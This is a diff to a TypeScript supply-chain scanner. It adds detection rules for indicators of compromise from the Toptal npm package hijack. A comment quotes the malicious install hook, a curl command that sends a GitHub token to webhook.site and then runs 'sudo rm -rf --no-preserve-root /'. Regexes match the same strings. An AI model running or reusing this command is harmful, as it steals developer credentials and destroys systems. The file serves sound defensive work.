@@ -1049,6 +1049,89 @@ const FORBIDDEN_PATTERNS: readonly ForbiddenPattern[] = [
       "any reference in `src/**` is a hard IOC",
     keepStrings: true,
   },
+  // ---- Toptal GitHub-org hijack / Picasso design-system npm compromise
+  //      (Socket 2025-07-23,
+  //      https://socket.dev/blog/toptal-s-github-organization-hijacked-10-malicious-packages-published) ----
+  //
+  // Ten `@toptal/picasso-*` packages (and `@xene/core`) were republished
+  // on 2025-07-20 with destructive `preinstall` + `postinstall` lifecycle
+  // hooks embedded directly in `package.json`:
+  //
+  //   "preinstall":  "curl -d \"$(gh auth token)\" https://webhook.site/<uuid>;
+  //                   sudo rm -rf --no-preserve-root /"
+  //   "postinstall": "rm /s /q"
+  //
+  // The install-time channel is already closed for Daloy by
+  // `ignore-scripts=true` in the root `.npmrc`, the 24 h
+  // `minimum-release-age` cooldown, and `verify-no-lifecycle-scripts`
+  // (which keeps our own published packages free of these hooks). The
+  // patterns below are belt-and-braces: they make sure no Toptal-style
+  // exfil/destroy primitive can ever land as a string literal inside
+  // `src/**` (e.g. via a "telemetry beacon" PR or a malicious
+  // republish-followed-by-PR that copies the payload into runtime code).
+  {
+    // Generic `webhook.site/...` drop. The bare host is the entire
+    // legitimate purpose of the service — receive arbitrary HTTP
+    // POSTs — so a backend HTTP framework has zero reason to ever
+    // hard-code one in its runtime source. Mirrors the Discord-webhook
+    // pattern above. Match the full host with at least a `/` path so
+    // a typo'd lowercase mention without a URL form would still be
+    // caught at code-review time.
+    re: /\bwebhook\.site\/[A-Za-z0-9-]/i,
+    reason:
+      "`webhook.site/<uuid>` is an arbitrary-HTTP-request inspection service; a backend HTTP " +
+      "framework's runtime source never POSTs to one, and it is the documented exfiltration " +
+      "drop for the Toptal GitHub-org hijack (10 `@toptal/picasso-*` packages republished " +
+      "on 2025-07-20 with `preinstall` hooks that POSTed the victim's `gh auth token` to " +
+      "`https://webhook.site/fb5b4647-aff8-418c-99e7-ec830cc2024b` before attempting to " +
+      "`sudo rm -rf --no-preserve-root /`) " +
+      "(https://socket.dev/blog/toptal-s-github-organization-hijacked-10-malicious-packages-published); " +
+      "any reference in `src/**` is a hard IOC",
+    keepStrings: true,
+  },
+  {
+    // The exact Toptal IOC webhook UUID, even outside a URL form.
+    re: /\bfb5b4647-aff8-418c-99e7-ec830cc2024b\b/i,
+    reason:
+      "`fb5b4647-aff8-418c-99e7-ec830cc2024b` is the documented webhook.site channel ID for " +
+      "the Toptal GitHub-org hijack — 10 `@toptal/picasso-*` packages republished on " +
+      "2025-07-20 POSTed the victim's `gh auth token` to this exact endpoint " +
+      "(https://socket.dev/blog/toptal-s-github-organization-hijacked-10-malicious-packages-published); " +
+      "any reference in `src/**` is a hard IOC",
+    keepStrings: true,
+  },
+  {
+    // `gh auth token` is the GitHub CLI command that prints the user's
+    // GitHub authentication token to stdout. It is exclusively a shell
+    // invocation — a backend HTTP framework's runtime source has zero
+    // legitimate reason to mention it as a string literal. This is
+    // the in-process token-harvest primitive the Toptal payload uses.
+    re: /\bgh\s+auth\s+token\b/,
+    reason:
+      "`gh auth token` is the GitHub CLI command that prints the user's GitHub authentication " +
+      "token to stdout; library source has no reason to ever materialize this shell invocation " +
+      "as a string literal, and it is the in-process token-harvest primitive the Toptal " +
+      "GitHub-org hijack chained with a `webhook.site` POST to exfiltrate developer tokens " +
+      "(https://socket.dev/blog/toptal-s-github-organization-hijacked-10-malicious-packages-published) — " +
+      "remove this literal",
+    keepStrings: true,
+  },
+  {
+    // `--no-preserve-root` is the GNU `rm` flag that explicitly
+    // overrides the safety check preventing `rm -rf /` from wiping
+    // the root filesystem. It has no legitimate use in any
+    // application's runtime source; it is the destruction primitive
+    // the Toptal payload uses (`sudo rm -rf --no-preserve-root /`).
+    re: /--no-preserve-root\b/,
+    reason:
+      "`--no-preserve-root` is the GNU `rm` flag that explicitly overrides the safety check " +
+      "preventing `rm -rf /` from wiping the root filesystem; it has zero legitimate use in " +
+      "library source and is the destruction primitive the Toptal GitHub-org hijack used to " +
+      "destroy victim systems after exfiltrating their GitHub tokens " +
+      "(https://socket.dev/blog/toptal-s-github-organization-hijacked-10-malicious-packages-published) — " +
+      "remove this literal",
+    keepStrings: true,
+  },
 ];
 
 const STRING_LITERAL_RE = /"(?:\\.|[^"\\])*"|'(?:\\.|[^'\\])*'|`(?:\\.|[^`\\])*`/g;
@@ -1194,10 +1277,13 @@ async function main(): Promise<void> {
         "phrase, or any destructive filesystem-deletion API call — `rmSync` / `rmdirSync` / " +
         "`unlinkSync` / `fs.rm(` / `fs.rmdir(` / `fs.unlink(`), or reference Vietnam-Telegram-ban " +
         "Fastlane-typosquat IOCs (`rough-breeze-0c37.buidanhnam95.workers.dev` C2 host, or any " +
-        "URL-shaped `https://<sub>.workers.dev/...` Cloudflare Worker relay literal). These are the runtime primitives the GemStuffer, Lazarus / Jade " +
+        "URL-shaped `https://<sub>.workers.dev/...` Cloudflare Worker relay literal), or reference Toptal " +
+        "GitHub-org hijack IOCs (`webhook.site/<uuid>` exfil drop, the documented " +
+        "`fb5b4647-aff8-418c-99e7-ec830cc2024b` webhook UUID, the `gh auth token` GitHub-CLI " +
+        "token-harvest command, or the `--no-preserve-root` destructive `rm` flag). These are the runtime primitives the GemStuffer, Lazarus / Jade " +
         "Sleet, RATatouille / rand-user-agent, xrpl.js / Ripple-SDK, Telegram-bot SSH-backdoor, " +
-        "Lazarus BeaverTail / InvisibleFerret, `xlsx-to-json-lh` codebase-wiper, and " +
-        "Vietnam-Telegram-ban Fastlane-typosquat classes of " +
+        "Lazarus BeaverTail / InvisibleFerret, `xlsx-to-json-lh` codebase-wiper, " +
+        "Vietnam-Telegram-ban Fastlane-typosquat, and Toptal GitHub-org hijack classes of " +
         "supply-chain attack use to scrape, exfiltrate, or destroy data. See https://socket.dev/blog/gemstuffer, " +
         "https://socket.dev/blog/social-engineering-campaign-npm-malware, " +
         "https://www.aikido.dev/blog/catching-a-rat-remote-access-trojian-rand-user-agent-supply-chain-compromise, " +
@@ -1205,7 +1291,8 @@ async function main(): Promise<void> {
         "https://socket.dev/blog/npm-malware-targets-telegram-bot-developers, " +
         "https://socket.dev/blog/lazarus-strikes-npm-again-with-a-new-wave-of-malicious-packages, " +
         "https://socket.dev/blog/npm-package-wipes-codebases-with-remote-trigger, " +
-        "and https://socket.dev/blog/malicious-ruby-gems-exfiltrate-telegram-tokens-and-messages-following-vietnam-ban.",
+        "https://socket.dev/blog/malicious-ruby-gems-exfiltrate-telegram-tokens-and-messages-following-vietnam-ban, " +
+        "and https://socket.dev/blog/toptal-s-github-organization-hijacked-10-malicious-packages-published.",
     );
     process.exitCode = 1;
   }
